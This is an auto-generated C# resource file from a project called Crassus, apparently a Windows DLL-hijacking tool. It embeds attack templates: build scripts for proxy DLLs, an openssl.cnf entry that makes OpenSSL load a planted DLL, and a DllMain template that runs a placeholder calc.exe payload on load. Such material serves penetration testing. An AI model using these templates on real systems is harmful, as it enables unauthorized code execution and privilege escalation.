﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Crassus.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Crassus.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to @echo off
        ///echo %PATH% &gt; path.txt
        ///FOR %%? IN (path.txt) DO ( SET /A strlength=%%~z? - 2 )
        ///if %strlength% GEQ 5500 goto vcvarserr
        ///call &quot;%VCINSTALLDIR%\Auxiliary\Build\vcvarsall.bat&quot; x86
        ///for /f %%f in (&apos;findstr /m /c:&quot;//BUILD_AS_32&quot; *.cpp&apos;) do (
        ///    cl /DADD_EXPORTS /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link /DEF:%%~nf.def
        ///    if not exist %%~nf.dll cl /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link
        ///)
        ///call &quot;%VCINSTALLDIR%\Auxiliary\Build\vcvars32.bat&quot; amd64
        ///for /f %%f in (&apos;findstr /m /c:&quot;//BUILD_A [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string build_bat {
            get {
                return ResourceManager.GetString("build.bat", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to ls *.cpp | xargs grep -l //BUILD_AS_32 | sed &apos;s/.cpp//&apos; | xargs -n1 -I{} bash -c &quot;i686-w64-mingw32-g++ -c -o {}.o {}.cpp -D ADD_EXPORTS &amp;&amp; i686-w64-mingw32-g++ -o {}.dll {}.o {}.def -s -shared -Wl,--subsystem,windows || i686-w64-mingw32-g++ -c -o {}.o {}.cpp &amp;&amp; i686-w64-mingw32-g++ -o {}.dll {}.o -s -shared -Wl,--subsystem,windows&quot;
        ///ls *.cpp | xargs grep -l //BUILD_AS_64 | sed &apos;s/.cpp//&apos; | xargs -n1 -I{} bash -c &quot;x86_64-w64-mingw32-g++ -c -o {}.o {}.cpp -D ADD_EXPORTS &amp;&amp; x86_64-w64-mingw32-g++ -o {}.dll {}. [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string build_sh {
            get {
                return ResourceManager.GetString("build.sh", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to openssl_conf = openssl_init
        ///[openssl_init]
        ///# This will attempt to load the file c:\tmp\calc.dll as part of OpenSSL initialization
        ///# Be sure to pay attention to whether this needs to be a 64-bit or a 32-bit library
        ////tmp/calc = asdf
        ///.
        /// </summary>
        internal static string openssl_cnf {
            get {
                return ResourceManager.GetString("openssl.cnf", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to #pragma once
        ///    
        /////%_BUILD_AS%
        ///
        ///#include &lt;windows.h&gt;
        ///
        ///extern &quot;C&quot; {
        ///
        ///  VOID Payload() {
        ///      // Run your payload here.
        ///      WinExec(&quot;calc.exe&quot;, 1);
        ///  }
        ///
        ///  BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
        ///  {
        ///      switch (fdwReason)
        ///      {
        ///      case DLL_PROCESS_ATTACH:
        ///          Payload();
        ///          break;
        ///      case DLL_THREAD_ATTACH:
        ///          break;
        ///      case DLL_THREAD_DETACH:
        ///          break;
        ///      case DLL_PROCESS_DETACH:
        ///          break;
        ///      [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string proxy_dll_cpp {
            get {
                return ResourceManager.GetString("proxy.dll.cpp", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to EXPORTS
        ///    %_EXPORTS_%
        ///.
        /// </summary>
        internal static string proxy_dll_def {
            get {
                return ResourceManager.GetString("proxy.dll.def", resourceCulture);
            }
        }
    }
}
